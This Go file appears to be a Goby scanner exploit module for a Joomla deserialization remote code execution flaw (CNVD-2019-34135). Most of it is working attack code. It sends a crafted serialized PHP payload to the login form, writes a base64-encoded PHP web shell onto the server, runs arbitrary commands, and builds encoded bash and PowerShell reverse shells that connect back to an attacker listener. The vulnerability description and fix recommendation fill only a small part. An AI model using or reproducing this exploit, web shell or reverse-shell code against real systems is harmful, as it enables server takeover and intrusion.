package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "joomla  /configuration.php Code Execution Vulnerability(CNVD-2019-34135)",
    "Description": "<p>Joomla! is an open-source, cross-platform content management system (CMS) developed using PHP and MySQL.  </p><p> Joomla! configuration.php file has an RCE vulnerability. An attacker can exploit this vulnerability to write a Trojan to gain server privileges.</p>",
    "Product": "Joomla",
    "Homepage": "http://www.Joomla.org/",
    "DisclosureDate": "2019-10-09",
    "PostTime": "2024-07-11",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"Home\" && body=\"/index.php/component/users\"",
    "GobyQuery": "title=\"Home\" && body=\"/index.php/component/users\"",
    "Level": "2",
    "Impact": "<p>Joomla! configuration.php file has an RCE vulnerability. An attacker can exploit this vulnerability to write a Trojan to gain server privileges.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.Joomla.org/\">http://www.Joomla.org/</a></p>",
    "References": [
        "https://avd.aliyun.com/detail?id=AVD-2021-904855"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByPowershellBase64,ByBashBase64",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2019-34135"
    ],
    "CVSSScore": "7.0",
    "Translation": {
        "CN": {
            "Name": "joomla /configuration.php 反序列化代码执行漏洞（CNVD-2019-34135）",
            "Product": "Joomla",
            "Description": "<p>Joomla!是一套使用PHP和MySQL开发的开源、跨平台的内容管理系统(CMS)。&nbsp;</p><p>Joomla! configuration.php文件存在RCE漏洞。攻击者可利用漏洞写入一句话木马，获得服务器权限。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.Joomla.org/\">http://www.Joomla.org/</a><br></p>",
            "Impact": "<p>Joomla! configuration.php文件存在RCE漏洞。攻击者可利用漏洞写入一句话木马，获得服务器权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "joomla  /configuration.php Code Execution Vulnerability(CNVD-2019-34135)",
            "Product": "Joomla",
            "Description": "<p>Joomla! is an open-source, cross-platform content management system (CMS) developed using PHP and MySQL.&nbsp;&nbsp;</p><p>&nbsp;Joomla! configuration.php file has an RCE vulnerability. An attacker can exploit this vulnerability to write a Trojan to gain server privileges.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.Joomla.org/\">http://www.Joomla.org/</a><br></p>",
            "Impact": "<p>Joomla! configuration.php file has an RCE vulnerability. An attacker can exploit this vulnerability to write a Trojan to gain server privileges.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10969"
}`
	setPayloadRequest_ipF49btw9ss95mWLaK85zwwwOlpYmQaN := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//漏洞url地址
		vulnurl := "/"
		makeRequest := httpclient.NewGetRequestConfig(vulnurl)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
			if resp.StatusCode == 200 {
				header := resp.HeaderString.String()
				//如果不含有Set-Cookie字段，则返回错误
				if !strings.Contains(header, "Set-Cookie") {
					return "", "", errors.New("Set-Cookie is null")
				}
				cookie := strings.Split(strings.Split(header, "Set-Cookie: ")[1], ";")[0]
				makeRequest.Header.Store("Cookie", cookie)
				if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
					if resp.StatusCode == 200 {
						regex := regexp.MustCompile("([a-zA-Z0-9]{32})")
						key := regex.FindString(resp.RawBody)
						//如果key为空，则返回错误
						if key == "" {
							return "", "", errors.New("key is null")
						}
						makeRequest2 := httpclient.NewPostRequestConfig(vulnurl)
						makeRequest2.VerifyTls = false
						makeRequest2.Timeout = 10
						makeRequest2.FollowRedirect = false
						makeRequest2.Header.Store("Cookie", cookie)
						makeRequest2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						num := 24 + len(command)
						//对command进行url编码
						//将command中的"替换为\"
						command = url.QueryEscape(command)
						data := `username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22assert%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A` + strconv.Itoa(num) + `%3A%22` + command + `+%7C%7C+%24a%3D%27http%3A%2F%2Fgb_cool%27%3B%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&option=com_users&task=user.login&` + key + `=1`
						makeRequest2.Data = data
						if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest2); err == nil {
							if resp.StatusCode == 303 {
								makeRequest.URI = "/index.php/component/users/?view=login"
								if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
									if resp.StatusCode == 200 {
										return resp.RawBody, vulnurl, nil
									}
								}
							}
						}
					}
				}
			}
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := ""
		return commandResult, vulnurl, nil
	}
	setPayloadRequestHash8237 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//漏洞url地址
		vulnurl := "/"
		makeRequest := httpclient.NewGetRequestConfig(vulnurl)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
			if resp.StatusCode == 200 {
				header := resp.HeaderString.String()
				//如果不含有Set-Cookie字段，则返回错误
				if !strings.Contains(header, "Set-Cookie") {
					return "", "", errors.New("Set-Cookie is null")
				}
				cookie := strings.Split(strings.Split(header, "Set-Cookie: ")[1], ";")[0]
				makeRequest.Header.Store("Cookie", cookie)
				if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
					if resp.StatusCode == 200 {
						regex := regexp.MustCompile("([a-zA-Z0-9]{32})")
						key := regex.FindString(resp.RawBody)
						//如果key为空，则返回错误
						if key == "" {
							return "", "", errors.New("key is null")
						}
						makeRequest2 := httpclient.NewPostRequestConfig(vulnurl)
						makeRequest2.VerifyTls = false
						makeRequest2.Timeout = 10
						makeRequest2.FollowRedirect = false
						makeRequest2.Header.Store("Cookie", cookie)
						makeRequest2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
						//生成6为随机字母组成文件名
						filename := goutils.RandomHexString(6)
						data := `username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22assert%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A233%3A%22file_put_contents%28%27` + filename + `.php%27%2Cbase64_decode%28%27PD9waHAgaWYoaXNzZXQoJF9HRVRbJ2NtZCddKSl7JGNtZD1iYXNlNjRfZGVjb2RlKCRfR0VUWydjbWQnXSk7ZWNobyBiYXNlNjRfZW5jb2RlKHNoZWxsX2V4ZWMoJGNtZCkpO3VubGluayhfX0ZJTEVfXyk7fQ%3D%3D%27%29%29+%7C%7C+%24a%3D%27http%3A%2F%2Fgb_cool%27%3B%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&option=com_users&task=user.login&` + key + `=1`
						makeRequest2.Data = data
						if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest2); err == nil {
							if resp.StatusCode == 303 {
								makeRequest.URI = "/index.php/component/users/?view=login"
								if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
									if resp.StatusCode == 200 {
										bytes := []byte(command)
										encodedcommand := base64.StdEncoding.EncodeToString(bytes)
										makeRequest.URI = "/" + filename + ".php?cmd=" + encodedcommand
										if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
											if resp.StatusCode == 200 {
												return resp.RawBody, vulnurl, nil
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := ""
		return commandResult, vulnurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequest_ipF49btw9ss95mWLaK85zwwwOlpYmQaN

			text := goutils.RandomHexString(16)
			//对text进行base64编码
			base64text := base64.StdEncoding.EncodeToString([]byte(text))
			pocCommand := `printf(base64_decode('` + base64text + `'))`

			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)

			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequest_ipF49btw9ss95mWLaK85zwwwOlpYmQaN
			runPayload2 := setPayloadRequestHash8237

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c {echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload2(expResult.HostInfo, command)
				judge := 1
				if err != nil || len(Result) == 0 {
					judge = 0
				} else {
					expResult.Success = true
					//结果进行base64解码
					bytes, _ := base64.StdEncoding.DecodeString(Result)
					expResult.Output = string(bytes)
				}
				if judge == 0 {
					fmt.Println("command:", command)
					command = strings.Replace(command, "\"", "\\\"", -1)
					command = strings.Replace(command, "'", "\\'", -1)
					command = "system('" + command + "')"
					Result, _, err = runPayload(expResult.HostInfo, command)
					//
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					}
					if len(Result) > 0 {
						expResult.Success = true
						//正则匹配((.|\n)*?)Duplicate entry
						reRequest := regexp.MustCompile("((.|\n)*?)Duplicate entry")
						getserver := reRequest.FindStringSubmatch(Result)
						expResult.Output = getserver[1]
					} else {
						expResult.Success = false
						expResult.Output = err.Error()
					}
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload2(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
